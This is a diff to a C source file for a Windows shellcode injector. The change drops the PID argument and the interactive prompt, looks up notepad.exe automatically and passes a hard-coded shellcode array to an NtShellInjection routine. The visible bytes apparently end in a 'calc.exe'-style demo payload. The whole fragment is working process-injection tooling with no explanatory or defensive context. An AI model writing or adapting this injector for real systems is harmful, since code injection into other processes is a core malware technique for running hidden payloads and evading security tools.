@@ -30,37 +30,24 @@
     0x63,0x2e,0x65,0x78,0x65,0x00
 };
 
-int main(int argc, char* argv[])
+int main()
 {
 
-    // make sure user supplies a PID
-    if (argc < 2)
-    {
-        WARN("PID Not Supplied to Inject.exe!");
-        return -1;
-    }
+    DWORD PID;
+    HANDLE hProcess;
 
-    // prints out unencrypted shellcode
-    for (int i = 0; i < sizeof(Shellcode); i++)
+    if (!GetRemoteProcID(L"notepad.exe", &PID, &hProcess))
     {
-        if (i % 16 == 0)
-        {
-            printf("\n ");
-        }
-        Sleep(1);
-        printf(" %02x", Shellcode[i]);
+        PRINT_ERROR("GetRemoteProcID");
+        return 1;
     }
-    puts("\n");
 
     size_t sc_size = sizeof(Shellcode);
     INFO("Current Shellcode Address: %p", &Shellcode);
     INFO("Shellcode size: %zu bytes", sc_size);
 
-    printf("[>] Press <Enter> To Inject Payload!\n");
-    getchar();
 
-
-    if (!NtShellInjection(atoi(argv[1]), Shellcode, sc_size))
+    if (!NtShellInjection(PID, hProcess, Shellcode, sc_size))
     {
         WARN("Injection Failed! Exiting...");
         return -1;
